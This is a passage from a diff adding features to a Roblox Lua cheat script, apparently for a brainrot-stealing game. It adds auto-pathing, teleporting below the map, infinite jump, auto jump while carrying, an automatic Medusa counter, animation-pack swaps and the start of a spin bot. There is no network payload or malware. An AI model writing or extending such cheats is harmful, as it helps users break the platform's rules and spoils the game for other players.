+            if (target-root.Position).Magnitude<1 then FRHubAutoLeftPhase=2; return end
+            local delta=FRHubAutoPathPOS.L1-root.Position; local move=Vector3.new(delta.X,0,delta.Z).Unit
+            hum:Move(move,false); setFRHubAutoVelocity(root,Vector3.new(move.X*spd,0,move.Z*spd))
+        elseif FRHubAutoLeftPhase==2 then
+            local target=Vector3.new(FRHubAutoPathPOS.L2.X,root.Position.Y,FRHubAutoPathPOS.L2.Z)
+            if (target-root.Position).Magnitude<1 then
+                hum:Move(Vector3.zero,false); setFRHubAutoVelocity(root,Vector3.zero)
+                autoLeftEnabled=false
+                if FRHubAutoPathConns.autoLeft then FRHubAutoPathConns.autoLeft:Disconnect(); FRHubAutoPathConns.autoLeft=nil end
+                FRHubAutoLeftPhase=1
+                if autoLeftSetVisual then autoLeftSetVisual(false) end
+                if __HH.mobBtnRefs.autoLeft then __HH.mobBtnRefs.autoLeft(false) end
+                saveConfig()
+                return
+            end
+            local delta=FRHubAutoPathPOS.L2-root.Position; local move=Vector3.new(delta.X,0,delta.Z).Unit
+            hum:Move(move,false); setFRHubAutoVelocity(root,Vector3.new(move.X*spd,0,move.Z*spd))
+        end
+    end)
+end
+
+stopAutoLeft = function()
+    if FRHubAutoPathConns.autoLeft then FRHubAutoPathConns.autoLeft:Disconnect(); FRHubAutoPathConns.autoLeft=nil end
+    FRHubAutoLeftPhase=1
+    local char=LP.Character
+    if char then
+        local hum=char:FindFirstChildOfClass("Humanoid"); if hum then hum:Move(Vector3.zero,false) end
+    end
+    if autoLeftSetVisual then autoLeftSetVisual(false) end
+    if __HH.mobBtnRefs.autoLeft then __HH.mobBtnRefs.autoLeft(false) end
+end
+
+startAutoRight = function()
+    if FRHubAutoPathConns.autoRight then FRHubAutoPathConns.autoRight:Disconnect() end
+    FRHubAutoRightPhase=1
+    FRHubAutoPathConns.autoRight=RunService.Heartbeat:Connect(function()
+        if not autoRightEnabled then return end
+        local char=LP.Character; if not char then return end
+        local root=char:FindFirstChild("HumanoidRootPart"); local hum=char:FindFirstChildOfClass("Humanoid")
+        if not root or not hum then return end; local spd=getFRHubAutoMoveSpeed()
+        if FRHubAutoRightPhase==1 then
+            local target=Vector3.new(FRHubAutoPathPOS.R1.X,root.Position.Y,FRHubAutoPathPOS.R1.Z)
+            if (target-root.Position).Magnitude<1 then FRHubAutoRightPhase=2; return end
+            local delta=FRHubAutoPathPOS.R1-root.Position; local move=Vector3.new(delta.X,0,delta.Z).Unit
+            hum:Move(move,false); setFRHubAutoVelocity(root,Vector3.new(move.X*spd,0,move.Z*spd))
+        elseif FRHubAutoRightPhase==2 then
+            local target=Vector3.new(FRHubAutoPathPOS.R2.X,root.Position.Y,FRHubAutoPathPOS.R2.Z)
+            if (target-root.Position).Magnitude<1 then
+                hum:Move(Vector3.zero,false); setFRHubAutoVelocity(root,Vector3.zero)
+                autoRightEnabled=false
+                if FRHubAutoPathConns.autoRight then FRHubAutoPathConns.autoRight:Disconnect(); FRHubAutoPathConns.autoRight=nil end
+                FRHubAutoRightPhase=1
+                if autoRightSetVisual then autoRightSetVisual(false) end
+                if __HH.mobBtnRefs.autoRight then __HH.mobBtnRefs.autoRight(false) end
+                saveConfig()
+                return
+            end
+            local delta=FRHubAutoPathPOS.R2-root.Position; local move=Vector3.new(delta.X,0,delta.Z).Unit
+            hum:Move(move,false); setFRHubAutoVelocity(root,Vector3.new(move.X*spd,0,move.Z*spd))
+        end
+    end)
+end
+
+stopAutoRight = function()
+    if FRHubAutoPathConns.autoRight then FRHubAutoPathConns.autoRight:Disconnect(); FRHubAutoPathConns.autoRight=nil end
+    FRHubAutoRightPhase=1
+    local char=LP.Character
+    if char then
+        local hum=char:FindFirstChildOfClass("Humanoid"); if hum then hum:Move(Vector3.zero,false) end
+    end
+    if autoRightSetVisual then autoRightSetVisual(false) end
+    if __HH.mobBtnRefs.autoRight then __HH.mobBtnRefs.autoRight(false) end
+end
+
+toggleAutoLeft = function()
+    autoLeftEnabled=not autoLeftEnabled
+    if autoLeftSetVisual then autoLeftSetVisual(autoLeftEnabled) end
+    if __HH.mobBtnRefs.autoLeft then __HH.mobBtnRefs.autoLeft(autoLeftEnabled) end
+    if autoLeftEnabled then startAutoLeft() else stopAutoLeft() end
+    saveConfig()
+end
+
+toggleAutoRight = function()
+    autoRightEnabled=not autoRightEnabled
+    if autoRightSetVisual then autoRightSetVisual(autoRightEnabled) end
+    if __HH.mobBtnRefs.autoRight then __HH.mobBtnRefs.autoRight(autoRightEnabled) end
+    if autoRightEnabled then startAutoRight() else stopAutoRight() end
+    saveConfig()
+end
+
+LP.CharacterAdded:Connect(function()
+    task.wait(0.5)
+    if autoLeftEnabled then startAutoLeft() end
+    if autoRightEnabled then startAutoRight() end
+end)
+end
+
+function runDrop()
+    -- Ace Drop: briefly rise, then place the player safely on the ground.
+    if __HH.dropActive then return end
+    if __HH.autoTPEnabled and __HH.stopAutoTP then __HH.stopAutoTP() end
+
+    local char = LP.Character
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+
+    __HH.dropActive = true
+    local startTime = tick()
+    local dropConn
+    dropConn = RunService.Heartbeat:Connect(function()
+        local currentChar = LP.Character
+        local currentRoot = currentChar and currentChar:FindFirstChild("HumanoidRootPart")
+        if not currentChar or not currentRoot then
+            if dropConn then dropConn:Disconnect() end
+            __HH.dropActive = false
+            return
+        end
+
+        if tick() - startTime >= 0.2 then
+            if dropConn then dropConn:Disconnect() end
+            local rayParams = RaycastParams.new()
+            rayParams.FilterDescendantsInstances = {currentChar}
+            rayParams.FilterType = Enum.RaycastFilterType.Exclude
+            local rayResult = workspace:Raycast(currentRoot.Position, Vector3.new(0, -2000, 0), rayParams)
+            if rayResult then
+                local hum = currentChar:FindFirstChildOfClass("Humanoid")
+                local offset = (hum and hum.HipHeight or 2) + (currentRoot.Size.Y / 2)
+                currentRoot.CFrame = CFrame.new(currentRoot.Position.X, rayResult.Position.Y + offset, currentRoot.Position.Z)
+                currentRoot.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                currentRoot.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+            end
+            __HH.dropActive = false
+            return
+        end
+
+        currentRoot.Velocity = Vector3.new(currentRoot.Velocity.X, 150, currentRoot.Velocity.Z)
+    end)
+end
+
+local _lastTPTime = 0
+local function doPureAutoTPDown(force)
+    local char = LP.Character; if not char then return end
+    local hrp = char:FindFirstChild("HumanoidRootPart"); if not hrp then return end
+    local hum2 = char:FindFirstChildOfClass("Humanoid"); if not hum2 then return end
+    if hum2.Health <= 0 then return end
+    local now = tick()
+    if now - _lastTPTime < 0.08 then return end
+    if not force then
+        if hum2.FloorMaterial ~= Enum.Material.Air then return end
+        if not (hrp.Position.Y >= __HH.autoTPHeight) then return end
+    end
+    if hrp.Position.Y <= -6.5 and not force then return end
+    _lastTPTime = now
+    hrp.CFrame = CFrame.new(hrp.Position.X, -7.00, hrp.Position.Z) * CFrame.Angles(0, select(2, hrp.CFrame:ToEulerAnglesYXZ()), 0)
+end
+
+function startAutoTP()
+    if __HH.autoTPConn then task.cancel(__HH.autoTPConn); __HH.autoTPConn = nil end
+    __HH.autoTPConn = task.spawn(function()
+        while __HH.autoTPEnabled do task.wait(0.1); pcall(function() doPureAutoTPDown(false) end) end
+    end)
+end
+
+__HH.stopAutoTP = function()
+    __HH.autoTPEnabled = false
+    if __HH.autoTPConn then task.cancel(__HH.autoTPConn); __HH.autoTPConn = nil end
+end
+
+-- TP DOWN backend ported from FRHUB. Pure's previous manual TP DOWN
+-- dispatch was removed; every TP DOWN surface calls this directly.
+__HH.tpToGround = function()
+    local char=LP.Character; if not char then return end
+    local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then return end
+    hrp.CFrame=CFrame.new(hrp.Position.X,-7.00,hrp.Position.Z)*CFrame.Angles(0,select(2,hrp.CFrame:ToEulerAnglesYXZ()),0)
+
+    -- FRHUB finishes with _setV(hrp, Vector3.zero). Clear Pure's equivalent
+    -- movement constraints without using the deleted Pure TP DOWN backend.
+    if _G.PureCursedClearAimVelocity then pcall(_G.PureCursedClearAimVelocity) end
+    if _G.PureCursedClearAutoPathVelocity then pcall(_G.PureCursedClearAutoPathVelocity,hrp) end
+    destroySpeedLV()
+    destroyVertLV()
+end
+
+__HH.startUnwalk = function()
+    local c = LP.Character; if not c then return end
+    local hum = c:FindFirstChildOfClass("Humanoid")
+    if hum then for _, t in ipairs(hum:GetPlayingAnimationTracks()) do t:Stop() end end
+    local anim = c:FindFirstChild("Animate")
+    if anim then __HH.unwalkSavedAnimate = anim:Clone(); anim:Destroy() end
+end
+
+__HH.stopUnwalk = function()
+    local c = LP.Character
+    if c and __HH.unwalkSavedAnimate then __HH.unwalkSavedAnimate:Clone().Parent = c; __HH.unwalkSavedAnimate = nil end
+end
+
+
+-- Ace Animation Pack (Replaced with Asker Hub Animation Packs)
+__HH.aceSelectedAnimationPack = "OFF"
+__HH.aceAnimationPackIndex = 1
+__HH.aceAnimationPackList = {
+    "OFF",
+    "Unwalk",
+    "Hit Harder",
+    "Crazy",
+    "Adidas Sports",
+    "Adidas Community",
+    "Adidas Aura",
+    "Wicked Popular",
+    "Elder",
+    "Zombie",
+    "Mage",
+    "Catwalk Glam",
+    "Astronaut",
+    "Wicked \"Dancing Through Life\"",
+    "Werewolf",
+    "Superhero",
+    "Toy",
+    "No Boundaries",
+    "NFL",
+    "Amazon Unboxed",
+    "Vampire",
+    "Ninja",
+    "Robot",
+    "Levitation",
+    "Stylish",
+    "Bubbly",
+    "Cartoon"
+}
+local aceAnimationPacks = {
+    ["Crazy"] = {
+        WalkAnim = 134824450619865,
+        RunAnim = 134824450619865,
+        JumpAnim = 121454505477205,
+        FallAnim = 94788218468396,
+        SwimIdle = 121454505477205,
+        Swim = 121454505477205,
+        Animation1 = 133806214992291,
+        Animation2 = 94970088341563,
+        ClimbAnim = 121454505477205,
+    },
+    ["Adidas Sports"] = {
+        WalkAnim = 18537392113,
+        RunAnim  = 18537384940,
+        JumpAnim = 18537380791,
+        FallAnim = 18537367238,
+        SwimIdle = 18537387180,
+        Swim     = 18537389531,
+        Animation1 = 18537376492,
+        Animation2 = 18537371272,
+        ClimbAnim = 18537363391,
+    },
+    ["Adidas Community"] = {
+        WalkAnim = 122150855457006,
+        RunAnim  = 82598234841035,
+        JumpAnim = 75290611992385,
+        FallAnim = 98600215928904,
+        SwimIdle = 109346520324160,
+        Swim     = 133308483266208,
+        Animation1 = 122257458498464,
+        Animation2 = 102357151005774,
+        ClimbAnim = 88763136693023,
+    },
+    ["Adidas Aura"] = {
+        WalkAnim = 83842218823011,
+        RunAnim  = 118320322718866,
+        JumpAnim = 109996626521204,
+        FallAnim = 95603166884636,
+        SwimIdle = 94922130551805,
+        Swim     = 134530128383903,
+        Animation1 = 110211186840347,
+        Animation2 = 114191137265065,
+        ClimbAnim = 97824616490448,
+    },
+    ["Wicked Popular"] = {
+        WalkAnim = 92072849924640,
+        RunAnim = 72301599441680,
+        JumpAnim = 104325245285198,
+        FallAnim = 121152442762481,
+        Animation1 = 118832222982049,
+        ClimbAnim = 131326830509784,
+        SwimIdle = 113199415118199,
+        Swim = 99384245425157,
+        Animation2 = 76049494037641,
+    },
+    Elder = {
+        WalkAnim = 10921111375,
+        RunAnim  = 10921104374,
+        JumpAnim = 10921107367,
+        FallAnim = 10921105765,
+        SwimIdle = 10921110146,
+        Swim     = 10921108971,
+        ClimbAnim = 10921100400,
+        Animation1 = 10921101664,
+        Animation2 = 10921102574,
+    },
+    Zombie = {
+        WalkAnim = 10921355261,
+        RunAnim  = 616163682,
+        JumpAnim = 10921351278,
+        FallAnim = 10921350320,
+        SwimIdle = 10921353442,
+        Swim     = 10921352344,
+        Animation1 = 10921344533,
+        Animation2 = 10921345304,
+        ClimbAnim = 10921343576,
+    },
+    Mage = {
+        WalkAnim = 10921152678,
+        RunAnim  = 10921148209,
+        JumpAnim = 10921149743,
+        FallAnim = 10921148939,
+        SwimIdle = 10921151661,
+        Swim     = 10921150788,
+        ClimbAnim = 10921143404,
+        Animation1 = 10921144709,
+        Animation2 = 10921145797,
+    },
+    ["Catwalk Glam"] = {
+        WalkAnim = 109168724482748,
+        RunAnim  = 81024476153754,
+        JumpAnim = 116936326516985,
+        FallAnim = 92294537340807,
+        SwimIdle = 98854111361360,
+        Swim     = 134591743181628,
+        ClimbAnim = 119377220967554,
+        Animation1 = 133806214992291,
+        Animation2 = 94970088341563,
+    },
+    Astronaut = {
+        WalkAnim = 10921046031,
+        RunAnim  = 10921039308,
+        JumpAnim = 10921042494,
+        FallAnim = 10921040576,
+        SwimIdle = 10921045006,
+        Swim     = 10921044000,
+        ClimbAnim = 10921032124,
+        Animation1 = 10921034824,
+        Animation2 = 10921036806,
+    },
+    ['Wicked "Dancing Through Life"'] = {
+        WalkAnim = 73718308412641,
+        RunAnim  = 135515454877967,
+        JumpAnim = 78508480717326,
+        FallAnim = 78147885297412,
+        SwimIdle = 129183123083281,
+        Swim     = 110657013921774,
+        ClimbAnim = 129447497744818,
+        Animation1 = 92849173543269,
+        Animation2 = 132238900951109,
+    },
+    Werewolf = {
+        WalkAnim = 10921342074,
+        RunAnim  = 10921336997,
+        JumpAnim = nil,
+        FallAnim = 10921337907,
+        SwimIdle = 10921341319,
+        Swim     = 10921340419,
+        ClimbAnim = 10921329322,
+        Animation1 = 10921330408,
+        Animation2 = 10921333667,
+    },
+    Superhero = {
+        WalkAnim = 10921298616,
+        RunAnim  = 10921291831,
+        JumpAnim = 10921294559,
+        FallAnim = 10921293373,
+        SwimIdle = 10921297391,
+        Swim     = 10921295495,
+        ClimbAnim = 10921286911,
+        Animation1 = 10921288909,
+        Animation2 = 10921290167,
+    },
+    Toy = {
+        WalkAnim = 10921312010,
+        RunAnim  = 10921306285,
+        JumpAnim = 10921308158,
+        FallAnim = 10921307241,
+        SwimIdle = 10921310341,
+        Swim     = 10921309319,
+        ClimbAnim = 10921300839,
+        Animation1 = 10921301576,
+        Animation2 = nil,
+    },
+    ["No Boundaries"] = {
+        WalkAnim = 18747074203,
+        RunAnim  = 18747070484,
+        JumpAnim = 18747069148,
+        FallAnim = 18747062535,
+        SwimIdle = 18747071682,
+        Swim     = 18747073181,
+        ClimbAnim = 18747060903,
+        Animation1 = 18747067405,
+        Animation2 = 18747063918,
+    },
+    NFL = {
+        WalkAnim = 110358958299415,
+        RunAnim  = 117333533048078,
+        JumpAnim = 119846112151352,
+        FallAnim = 129773241321032,
+        SwimIdle = 79090109939093,
+        Swim     = 132697394189921,
+        ClimbAnim = 134630013742019,
+        Animation1 = 92080889861410,
+        Animation2 = 74451233229259,
+    },
+    ["Amazon Unboxed"] = {
+        WalkAnim = 90478085024465,
+        RunAnim  = 134824450619865,
+        JumpAnim = 121454505477205,
+        FallAnim = 94788218468396,
+        SwimIdle = 129126268464847,
+        Swim     = 105962919001086,
+        ClimbAnim = 121145883950231,
+        Animation1 = 98281136301627,
+        Animation2 = nil,
+    },
+    Vampire = {
+        WalkAnim = 10921326949,
+        RunAnim  = 10921320299,
+        JumpAnim = 10921322186,
+        FallAnim = 10921321317,
+        SwimIdle = 10921325443,
+        Swim     = 10921324408,
+        ClimbAnim = 10921314188,
+        Animation1 = 10921315373,
+        Animation2 = nil,
+    },
+    Ninja = {
+        Run=656118852, Walk=656121766, Jump=656117878, Fall=656115606,
+        Swim=656119721, SwimIdle=656121397, Climb=656114359,
+        Idle={656117400,656118341,886742569}
+    },
+    Robot = {
+        Run=616091570, Walk=616095330, Jump=616090535, Fall=616087089,
+        Swim=616092998, SwimIdle=616094091, Climb=616086039,
+        Idle={616088211,616089559,885531463}
+    },
+    Levitation = {
+        Run=616010382, Walk=616013216, Jump=616008936, Fall=616005863,
+        Swim=616011509, SwimIdle=616012453, Climb=616003713,
+        Idle={616006778,616008087,886862142}
+    },
+    Stylish = {
+        Run=616140816, Walk=616146177, Jump=616139451, Fall=616134815,
+        Swim=616143378, SwimIdle=616144772, Climb=616133594,
+        Idle={616136790,616138447,886888594}
+    },
+    Bubbly = {
+        Run=910025107, Walk=910034870, Jump=910016857, Fall=910001910,
+        Swim=910028158, SwimIdle=910030921, Climb=909997997,
+        Idle={910004836,910009958,1018536639}
+    },
+    Cartoon = {
+        Run=742638842, Walk=742640026, Jump=742637942, Fall=742637151,
+        Swim=742639220, SwimIdle=742639812, Climb=742636889,
+        Idle={742637544,742638445,885477856}
+    },
+}
+local aceSavedAnimate = nil
+__HH.aceOriginalAnims = {}
+local aceHitHarderAnimEnabled = false
+local aceHitHarderAnims = {
+    idle1 = "rbxassetid://133806214992291", idle2 = "rbxassetid://94970088341563",
+    walk = "rbxassetid://707897309", run = "rbxassetid://707861613",
+    jump = "rbxassetid://116936326516985", fall = "rbxassetid://116936326516985",
+}
+
+local function aceGetAnimate(char)
+    char = char or LP.Character
+    return char and char:FindFirstChild("Animate") or nil
+end
+
+local function aceStopCurrentAnimations(char)
+    local hum = char and char:FindFirstChildOfClass("Humanoid")
+    if not hum then return end
+    for _, track in ipairs(hum:GetPlayingAnimationTracks()) do
+        pcall(function() track:Stop(0) end)
+    end
+end
+
+local function aceSetAnim(animObj, id)
+    if animObj and id then
+        local idStr = tostring(id)
+        if not string.find(idStr, "rbxassetid://") then
+            idStr = "rbxassetid://" .. idStr
+        end
+        pcall(function() animObj.AnimationId = idStr end)
+    end
+end
+
+local function aceEnsureAnim(folder, name)
+    if not folder then return nil end
+    local a = folder:FindFirstChild(name)
+    if not a then
+        a = Instance.new("Animation")
+        a.Name = name
+        a.Parent = folder
+    end
+    return a
+end
+
+local function aceEnsureIdleSlots(idleFolder, n)
+    if not idleFolder then return end
+    n = n or 2
+    for i = 1, n do
+        aceEnsureAnim(idleFolder, "Animation" .. i)
+    end
+end
+
+local function acePick(pack, ...)
+    for i = 1, select("#", ...) do
+        local k = select(i, ...)
+        local v = pack[k]
+        if v ~= nil then return v end
+    end
+    return nil
+end
+
+local function aceSaveOriginalAnimate(char)
+    if not char then return end
+    if aceSavedAnimate then return end
+    local animate = char:FindFirstChild("Animate")
+    if animate then
+        aceSavedAnimate = animate:Clone()
+    end
+end
+
+local function aceResetAnimations()
+    local char = LP.Character
+    if not char then return end
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if hum then
+        aceStopCurrentAnimations(char)
+    end
+    if not aceSavedAnimate then return end
+    local currentAnimate = char:FindFirstChild("Animate")
+    if currentAnimate then
+        currentAnimate:Destroy()
+    end
+    local newAnimate = aceSavedAnimate:Clone()
+    newAnimate.Parent = char
+    newAnimate.Disabled = true
+    task.wait(0.06)
+    newAnimate.Disabled = false
+end
+
+local function aceEnableUnwalk()
+    __HH.unwalkEnabled = true
+    local char = LP.Character
+    if char and char:FindFirstChild("Animate") then __HH.startUnwalk() end
+    if setUnwalkVisual then setUnwalkVisual(true) end
+end
+
+local function aceDisableUnwalk()
+    if __HH.unwalkEnabled then __HH.stopUnwalk() end
+    __HH.unwalkEnabled = false
+    if setUnwalkVisual then setUnwalkVisual(false) end
+end
+
+local function aceEnableHitHarderAnimation()
+    aceHitHarderAnimEnabled = true
+    local char = LP.Character
+    local animate = aceGetAnimate(char)
+    if not animate then return end
+    aceSaveOriginalAnimate(char)
+    aceStopCurrentAnimations(char)
+    local idle1 = animate.idle and animate.idle:FindFirstChild("Animation1")
+    local idle2 = animate.idle and animate.idle:FindFirstChild("Animation2")
+    local walkObj = animate.walk and animate.walk:FindFirstChild("WalkAnim")
+    local runObj = animate.run and animate.run:FindFirstChild("RunAnim")
+    local jumpObj = animate.jump and animate.jump:FindFirstChild("JumpAnim")
+    local fallObj = animate.fall and animate.fall:FindFirstChild("FallAnim")
+    if idle1 then pcall(function() idle1.AnimationId = aceHitHarderAnims.idle1 end) end
+    if idle2 then pcall(function() idle2.AnimationId = aceHitHarderAnims.idle2 end) end
+    if walkObj then pcall(function() walkObj.AnimationId = aceHitHarderAnims.walk end) end
+    if runObj then pcall(function() runObj.AnimationId = aceHitHarderAnims.run end) end
+    if jumpObj then pcall(function() jumpObj.AnimationId = aceHitHarderAnims.jump end) end
+    if fallObj then pcall(function() fallObj.AnimationId = aceHitHarderAnims.fall end) end
+    pcall(function()
+        animate.Disabled = true
+        task.wait()
+        animate.Disabled = false
+    end)
+end
+
+local function aceDisableHitHarderAnimation()
+    aceHitHarderAnimEnabled = false
+    aceResetAnimations()
+end
+
+__HH.aceSyncAnimationPackIndex = function()
+    for i, name in ipairs(__HH.aceAnimationPackList) do
+        if name == __HH.aceSelectedAnimationPack then
+            __HH.aceAnimationPackIndex = i
+            return
+        end
+    end
+    __HH.aceSelectedAnimationPack = "OFF"
+    __HH.aceAnimationPackIndex = 1
+end
+
+__HH.aceApplyAnimationPack = function(packName)
+    __HH.aceSelectedAnimationPack = packName or "OFF"
+    __HH.aceSyncAnimationPackIndex()
+
+    if __HH.aceSelectedAnimationPack ~= "Unwalk" then
+        aceDisableUnwalk()
+    end
+    if __HH.aceSelectedAnimationPack ~= "Hit Harder" and aceHitHarderAnimEnabled then
+        aceDisableHitHarderAnimation()
+    end
+    if __HH.aceSelectedAnimationPack == "Unwalk" then
+        aceResetAnimations()
+        aceEnableUnwalk()
+        return
+    end
+    if __HH.aceSelectedAnimationPack == "Hit Harder" then
+        aceEnableHitHarderAnimation()
+        return
+    end
+    if __HH.aceSelectedAnimationPack == "OFF" then
+        aceResetAnimations()
+        return
+    end
+
+    local pack = aceAnimationPacks[__HH.aceSelectedAnimationPack]
+    local char = LP.Character
+    local animate = aceGetAnimate(char)
+    if not pack or not animate then return end
+    aceSaveOriginalAnimate(char)
+    aceStopCurrentAnimations(char)
+
+    local runObj   = aceEnsureAnim(animate:FindFirstChild("run"),   "RunAnim")
+    local walkObj  = aceEnsureAnim(animate:FindFirstChild("walk"),  "WalkAnim")
+    local jumpObj  = aceEnsureAnim(animate:FindFirstChild("jump"),  "JumpAnim")
+    local fallObj  = aceEnsureAnim(animate:FindFirstChild("fall"),  "FallAnim")
+    local climbObj = aceEnsureAnim(animate:FindFirstChild("climb"), "ClimbAnim")
+    local swimObj  = aceEnsureAnim(animate:FindFirstChild("swim"),  "Swim")
+    local swimIdleObj = aceEnsureAnim(animate:FindFirstChild("swimidle"), "SwimIdle")
+    local idleFolder  = animate:FindFirstChild("idle")
+
+    aceSetAnim(walkObj,  acePick(pack, "WalkAnim", "Walk", "walk"))
+    aceSetAnim(runObj,   acePick(pack, "RunAnim", "Run", "run"))
+    aceSetAnim(jumpObj,  acePick(pack, "JumpAnim", "Jump", "jump"))
+    aceSetAnim(fallObj,  acePick(pack, "FallAnim", "Fall", "fall"))
+    aceSetAnim(climbObj, acePick(pack, "ClimbAnim", "Climb", "climb"))
+    aceSetAnim(swimObj,  acePick(pack, "Swim", "swim"))
+    aceSetAnim(swimIdleObj, acePick(pack, "SwimIdle", "swimidle") or acePick(pack, "Swim", "swim"))
+
+    if idleFolder then
+        local a1 = acePick(pack, "Animation1")
+        local a2 = acePick(pack, "Animation2")
+        if a1 or a2 then
+            aceEnsureIdleSlots(idleFolder, 2)
+            local id1 = a1 or a2
+            local id2 = a2 or a1 or id1
+            aceSetAnim(idleFolder:FindFirstChild("Animation1"), id1)
+            aceSetAnim(idleFolder:FindFirstChild("Animation2"), id2)
+        elseif pack.Idle and #pack.Idle > 0 then
+            aceEnsureIdleSlots(idleFolder, math.max(2, #pack.Idle))
+            aceSetAnim(idleFolder:FindFirstChild("Animation1"), pack.Idle[1])
+            aceSetAnim(idleFolder:FindFirstChild("Animation2"), pack.Idle[2] or pack.Idle[1])
+            for i = 3, #pack.Idle do
+                local a = idleFolder:FindFirstChild("Animation" .. i)
+                if a then aceSetAnim(a, pack.Idle[i]) end
+            end
+        elseif pack.idle and #pack.idle > 0 then
+            aceEnsureIdleSlots(idleFolder, math.max(2, #pack.idle))
+            aceSetAnim(idleFolder:FindFirstChild("Animation1"), pack.idle[1])
+            aceSetAnim(idleFolder:FindFirstChild("Animation2"), pack.idle[2] or pack.idle[1])
+            for i = 3, #pack.idle do
+                local a = idleFolder:FindFirstChild("Animation" .. i)
+                if a then aceSetAnim(a, pack.idle[i]) end
+            end
+        end
+    end
+
+    animate.Disabled = true
+    task.wait(0.06)
+    animate.Disabled = false
+
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if hum then
+        pcall(function()
+            hum:ChangeState(Enum.HumanoidStateType.Landed)
+            task.wait(0.03)
+            hum:ChangeState(Enum.HumanoidStateType.Running)
+        end)
+    end
+end
+
+-- Infinite Jump (voided) — manual + hold mode
+local function applyInfJumpBoost(boost)
+    if not __HH.infJumpEnabled then return end
+    if __HH.infJumpMode == "manual" then
+        local char = LP.Character; if not char then return end
+        local root = char:FindFirstChild("HumanoidRootPart")
+        if root then root.Velocity = Vector3.new(root.Velocity.X, boost, root.Velocity.Z) end
+    end
+end
+
+__HH.UIS.JumpRequest:Connect(function() applyInfJumpBoost(50) end)
+__HH.UIS.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode.Space and not __HH.UIS:GetFocusedTextBox() then
+        task.delay(0.12, function() if __HH.UIS:IsKeyDown(Enum.KeyCode.Space) then applyInfJumpBoost(50) end end)
+    end
+end)
+RunService.Heartbeat:Connect(function()
+    if __HH.infJumpEnabled and __HH.infJumpMode == "manual" then
+        if __HH.UIS:IsKeyDown(Enum.KeyCode.Space) then applyInfJumpBoost(50) end
+    end
+end)
+
+__HH.startHoldInfJump = function()
+    if __HH.holdInfJumpConn then return end
+    __HH.holdInfJumpConn = RunService.Heartbeat:Connect(function()
+        if not __HH.infJumpEnabled or __HH.infJumpMode ~= "hold" then return end
+        local char = LP.Character; if not char then return end
+        local root = char:FindFirstChild("HumanoidRootPart")
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if not root or not hum then return end
+        local isJumpHeld = __HH.UIS:IsKeyDown(Enum.KeyCode.Space) or (hum.Jump == true)
+        if isJumpHeld and root.Velocity.Y < 35 then root.Velocity = Vector3.new(root.Velocity.X, 55, root.Velocity.Z) end
+        if root.Velocity.Y < -120 then root.Velocity = Vector3.new(root.Velocity.X, -120, root.Velocity.Z) end
+    end)
+end
+
+__HH.stopHoldInfJump = function()
+    if __HH.holdInfJumpConn then __HH.holdInfJumpConn:Disconnect(); __HH.holdInfJumpConn = nil end
+end
+
+-- ============ Auto Jump (while holding brainrot, every 2s) ============
+-- Detection style matches FR: WalkSpeed < 25 means you're carrying.
+-- While holding, applies one 55-stud upward hop every 2 seconds.
+__HH.autoJumpBrainrot = __HH.autoJumpBrainrot == true
+local autoJumpLastJump = 0
+RunService.Heartbeat:Connect(function()
+    if not __HH.autoJumpBrainrot then
+        autoJumpLastJump = 0
+        return
+    end
+    local char = LP.Character
+    local hum = char and char:FindFirstChildOfClass("Humanoid")
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    if not hum or not root then
+        autoJumpLastJump = 0
+        return
+    end
+    if hum.WalkSpeed >= 25 then
+        autoJumpLastJump = 0  -- not holding: reset so next grab jumps instantly
+        return
+    end
+    local now = tick()
+    if now - autoJumpLastJump < 2 then return end
+    autoJumpLastJump = now
+    local cur = root.AssemblyLinearVelocity
+    root.AssemblyLinearVelocity = Vector3.new(cur.X, 55, cur.Z)
+end)
+
+
+if __HH.infJumpEnabled and __HH.infJumpMode == "hold" then __HH.startHoldInfJump() end
+
+
+_G.PureMedusaState = _G.PureMedusaState or {connections={}, debounce=false, lastUsed=0}
+local function aceFindMedusa()
+    local char=LP.Character; if not char then return nil end
+    local function scan(container)
+        if not container then return nil end
+        for _,tool in ipairs(container:GetChildren()) do
+            if tool:IsA("Tool") then local n=tool.Name:lower(); if n:find("medusa") or n:find("head") or n:find("stone") then return tool end end
+        end
+    end
+    return scan(char) or scan(LP:FindFirstChildOfClass("Backpack") or LP:FindFirstChild("Backpack"))
+end
+local function aceUseMedusaCounter(force)
+    local state=_G.PureMedusaState
+    if (not force and not __HH.medusaCounterEnabled) or state.debounce or tick()-(state.lastUsed or 0)<25 then return end
+    local char=LP.Character; if not char then return end
+    state.debounce=true
+    local tool=aceFindMedusa()
+    if tool then
+        if tool.Parent~=char then local hum=char:FindFirstChildOfClass("Humanoid"); if hum then pcall(function() hum:EquipTool(tool) end); task.wait(.05) end end
+        pcall(function() tool:Activate() end); state.lastUsed=tick()
+    end
+    state.debounce=false
+end
+setupMedusa = function(char)
+    stopMedusaCounter(); char=char or LP.Character; if not char then return end
+    local function hook(part)
+        if part:IsA("BasePart") then table.insert(_G.PureMedusaState.connections,part:GetPropertyChangedSignal("Anchored"):Connect(function()
+            if __HH.medusaCounterEnabled and part.Anchored and part.Transparency==1 then aceUseMedusaCounter() end
+        end)) end
+    end
+    for _,part in ipairs(char:GetDescendants()) do hook(part) end
+    table.insert(_G.PureMedusaState.connections,char.DescendantAdded:Connect(hook))
+end
+stopMedusaCounter = function()
+    for _,conn in ipairs(_G.PureMedusaState.connections) do pcall(function() conn:Disconnect() end) end
+    _G.PureMedusaState.connections={}; _G.PureMedusaState.debounce=false
+end
+
+-- SPIN BOT (ported from FRHUB)
+do
+    local Spin = _G.PureSpinBot or {}
+    _G.PureSpinBot = Spin
+    if Spin.stop then pcall(Spin.stop) end
+    Spin.enabled = Spin.enabled == true
+    Spin.setVisual = nil
+
+    local _spBAV = nil
+    local _spMConns = {}
+
+    local function _spStop()
+        if _spBAV then pcall(function() _spBAV:Destroy() end); _spBAV = nil end
+        for _, connection in ipairs(_spMConns) do
+            pcall(function() connection:Disconnect() end)
+        end
+        _spMConns = {}
+    end
+
+    local function _spStart()
+        local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+        if not root then return end
